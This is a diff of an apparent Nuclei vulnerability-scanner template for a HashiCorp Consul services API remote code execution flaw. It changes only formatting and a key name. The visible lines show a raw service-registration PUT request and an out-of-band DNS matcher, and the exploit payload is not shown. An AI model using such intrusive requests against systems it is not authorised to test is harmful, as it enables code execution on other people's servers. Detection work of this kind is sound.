@@ -1,13 +1,11 @@
 id: hashicorp-consul-rce
-
 info:
   name: Hashicorp Consul Services Api RCE
   author: pikpikcu
   severity: critical
   reference: https://www.exploit-db.com/exploits/46074
   tags: hashicorp,rce,oast,intrusive
-
-http:
+requests:
   - raw:
       - | # Create USER
         PUT /v1/agent/service/register HTTP/1.1
@@ -24,7 +22,6 @@ http:
             "Timeout": "86400s"
           }
         }
-
     matchers:
       - type: word
         part: interactsh_protocol # Confirms the DNS Interaction
